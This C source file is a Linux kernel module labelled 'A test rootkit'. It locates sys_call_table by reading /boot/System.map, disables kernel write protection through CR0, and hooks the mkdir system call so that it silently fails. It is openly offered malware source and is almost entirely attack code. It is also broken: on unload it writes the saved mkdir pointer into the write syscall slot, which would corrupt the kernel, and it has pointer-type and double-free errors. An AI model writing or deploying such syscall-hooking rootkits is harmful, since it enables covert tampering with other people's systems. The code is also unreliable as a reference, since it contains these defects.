#include <linux/module.h>  /* Needed by all kernel modules */
#include <linux/kernel.h>  /* Needed for loglevels (KERN_WARNING, KERN_EMERG, KERN_INFO, etc.) */
#include <linux/init.h>    /* Needed for __init and __exit macros. */
#include <linux/unistd.h>  /* sys_call_table __NR_* system call function indices */
#include <linux/fs.h>      /* filp_open */
#include <linux/slab.h>    /* kmalloc */
#include <asm/paravirt.h> /* write_cr0 */
#include <asm/uaccess.h>  /* get_fs, set_fs */
#include <asm/paravirt.h> /* write_cr0 */
#include <linux/utsname.h>

MODULE_LICENSE("GPL");
MODULE_DESCRIPTION("A test rootkit");

#define MAX_VERSION_LEN 256
#define BOOT_PATH "/boot/System.map-"

unsigned long *syscall_table = NULL;
asmlinkage int (*original_write)(unsigned int, const char __user *, size_t);

char * get_map_file(void) {

  char base_filename[] = "/boot/System.map-";
  char * kernel_release = utsname()->release;
  char * kernel_release_buff = kmalloc(MAX_VERSION_LEN, GFP_KERNEL);

  //char * strncat (char * dest, const char * src, size_t count);
  strncpy(kernel_release_buff, BOOT_PATH, sizeof(base_filename));
  strncat (kernel_release_buff, kernel_release, MAX_VERSION_LEN);

  printk(KERN_WARNING "Kernel release %s\n", kernel_release_buff);

  return kernel_release_buff;
}


void free_map_file(char * map_file) {
  kfree(map_file);
}


int find_sys_call_table(char * filename) {

  printk(KERN_WARNING "Filename passed in: %s", filename);
  char system_map_entry[MAX_VERSION_LEN];
  struct file *f = NULL;
  int i = 0;

  mm_segment_t oldfs;
  oldfs = get_fs();
  set_fs(KERNEL_DS);

  printk(KERN_WARNING "in sys_call_table after the kmalloc");

  f = filp_open(filename, O_RDONLY, 0);
  printk(KERN_WARNING "after filp_open");
  if (IS_ERR(f) || (f == NULL)) {
      printk(KERN_EMERG "Error opening System.map- file: %s\n", filename);
      return -1;
  }

  while (vfs_read(f, system_map_entry + i, 1, &f->f_pos) == 1) {

    if ( system_map_entry[i] == '\n' || i == MAX_VERSION_LEN ) {
        // Reset the "column"/"character" counter for the row
        i = 0;

        if (strstr(system_map_entry, "sys_call_table") != NULL) {
            char *sys_string;
            char *system_map_entry_ptr = system_map_entry;

            sys_string = kmalloc(MAX_VERSION_LEN, GFP_KERNEL);
            if (sys_string == NULL) {
                filp_close(f, 0);
                set_fs(oldfs);
                kfree(filename);

                return -1;
            }

            memset(sys_string, 0, MAX_VERSION_LEN);
            strncpy(sys_string, strsep(&system_map_entry_ptr, " "), MAX_VERSION_LEN);

            //syscall_table = (unsigned long long *) kstrtoll(sys_string, NULL, 16);
            //syscall_table = kmalloc(sizeof(unsigned long *), GFP_KERNEL);
            //syscall_table = kmalloc(sizeof(syscall_table), GFP_KERNEL);
            kstrtoul(sys_string, 16, &syscall_table);
            printk(KERN_EMERG "syscall_table retrieved:  \n");

            kfree(sys_string);

            break;
        }

        memset(system_map_entry, 0, MAX_VERSION_LEN);
        continue;
    }

    i++;
  }

  filp_close(f, 0);
  set_fs(oldfs);

  free_map_file(filename);

  //printk(KERN_WARNING "syscall table at: %lld", syscall_table);
  return 0;
}

//asmlinkage long sys_mkdir(const char __user *pathname, umode_t mode);
asmlinkage int new_mkdir (const char __user *pathname, umode_t mode) {
    printk(KERN_EMERG "[+] mkdir be hooked muhfukka, can't mk nothing!");
    return 0;

    //return original_mkdir(pathname, mode);
}


static int __init root_init(void) {

  //correctly populates the syscall_table pointer
  find_sys_call_table(get_map_file());
  printk(KERN_EMERG "Syscall table address: %p\n", syscall_table);

  if (syscall_table != NULL) {
      write_cr0 (read_cr0 () & (~ 0x10000));
      original_write = (void *)syscall_table[__NR_mkdir];
      syscall_table[__NR_mkdir] = &new_mkdir;
      write_cr0 (read_cr0 () | 0x10000);
      printk(KERN_EMERG "[+] onload: sys_call_table hooked\n");
  } else {
      printk(KERN_EMERG "[-] onload: syscall_table is NULL\n");
  }

  return 0;
}


static void __exit root_cleanup(void) {
  printk(KERN_INFO "Cleaning up module.\n");
  if (syscall_table != NULL) {
      write_cr0 (read_cr0 () & (~ 0x10000));
      syscall_table[__NR_write] = original_write;
      write_cr0 (read_cr0 () | 0x10000);
      printk(KERN_EMERG "[+] onunload: sys_call_table unhooked\n");
  } else {
      printk(KERN_EMERG "[-] onunload: syscall_table is NULL\n");
  }
  printk(KERN_INFO "Goodbye cruel world!\n");
}


module_init(root_init);
module_exit(root_cleanup);
